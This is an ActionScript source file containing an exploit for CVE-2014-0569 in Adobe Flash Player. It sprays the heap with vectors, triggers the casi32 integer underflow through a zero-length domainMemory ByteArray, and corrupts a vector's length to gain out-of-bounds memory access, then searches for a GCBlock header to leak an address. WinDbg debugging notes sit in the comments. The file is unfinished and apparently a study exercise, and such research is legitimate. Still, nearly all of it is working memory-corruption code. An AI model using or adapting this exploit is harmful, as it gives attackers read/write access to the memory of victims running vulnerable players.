package
{
    import flash.display.Sprite;
    import flash.utils.ByteArray;
    import flash.system.ApplicationDomain;
    import flash.external.ExternalInterface;

    import avm2.intrinsics.memory.*;

    // Main.as
    public class Main extends Sprite
    {
        public function Main()
        {
            var i:uint = 0;
            var ov:Vector.<Object> = new <Object>[];

            // TODO: Heap Feng-shui
            // [vector.<uint>][vector.<uint>] ... [vector.<uint>] : 100 times
            // ---------------
            //  Size : 0x1000
            // [ByteArray buf]
            // ---------------
            // [vector.<uint>][vector.<uint>] ... [vector.<uint>] : 100 times
            // ---------------
            //  It will be corrupted
            //
            for (i = 0; i < 100; i++) {
                ov[i] = new <uint>[0x41424344, i]; 
                ov[i].length = 1022; // 1022 = 0x1000 / 4 - 2
            }

            // Make a ByteArray buffer into the hole 
            var ba:ByteArray = new ByteArray();
            ba.length = 0x1000;
            ba.writeUTFBytes("deadf00d");
            for (i = 0; i < 0x100; i++)
                ba.writeInt(0xbeadf00d);

            for (i = ov.length; i < 200; i++) {
                ov[i] = new <uint>[0x41424344, i]; 
                ov[i].length = 1022;
            }
            
            // Spray small vector.<uint> objects to allocate GCBlock
            // signature: 01010500 
            for (; i < 1000; i++)
                ov[i] = new <uint>[0x41424344, i];

            // Assign ba ByteArray to domainMemory
            ApplicationDomain.currentDomain.domainMemory = ba;

            // CVE-2014-0569: Make ByteArray length 0 so the casi32 integer underflow
            // can be exploited
            ba.atomicCompareAndSwapLength(0x1000, 0);

            // casi32(addr:int, expectedVal:int, newVal:int) : int
            // A compare and swap for domainMemory
            // Will return oldVal
            // Boom! overwrite length of vector.<uint>
            var boom:int = casi32(0x1000, 1022, 0x3fffffff);
            if (boom != 1022)
                return;

            ExternalInterface.call('alert', 'Let\'s debug the Flash Player');

            // TODO: find the corrupted vector.<uint> object
            for (i = 0; i < 200; i++) {
                if (ov[i].length != 1022)
                    break;
            }
            var cuv:Vector.<uint> = ov[i];

            // Set a processor breakpoint
            // s -a 0 L?10000000 "deadf00d"
            // 0:027> s -a 0 L?10000000 "deadf00d"
            // 06b11337  64 65 61 64 66 30 30 64-0d 77 72 69 74 65 55 54  deadf00d.writeUT
            // 076a032f  64 65 61 64 66 30 30 64-0d 77 72 69 74 65 55 54  deadf00d.writeUT
            // 079b0000  64 65 61 64 66 30 30 64-be ad f0 0d be ad f0 0d  deadf00d........ <-- ByteArray Buffer
            // --------
            // ba w4 079b0000 + 1008
            cuv[0] = 0x11111111;    // <--- break

            // TODO: find the DATALIST address using cuv
            // ---------------
            // [ByteArray buf]        : 0x1000 bytes
            // ---------------
            // cuv
            // [vector.<uint>[0x400]] : 0x1000 bytes
            // ---------------
            // GCBlock Header
            // ind: 0      1  2  3 ... 7
            // [0x1010500][ ][ ][ ]...[addr] : addr = GCBlock header's addr + 0x30
            // ---------------
            // ov[201]
            // [vector.<uint>[2]]     : 0x10 bytes
            // ---------------
            // ... ov[999]
            // ---------------
            var addr:uint = 0;
            for (i = 0x400;; i += 0x400) { // += 0x1000
                if (cuv[i - 2] == 0x1010500) {
                    addr = cuv[i + 9] - 0x30 - i * 4
                    cuv[0] = addr;  // <--- break
                    break;
                }
            }

            // Corrupted vector.<uint> object wasn't found
            if (!addr) {
               cuv[0] = 0x22222222; // <--- break
               return;
            }

            // Done: to be continue..
            cuv[0] = 0x33333333;
        }
    }
}
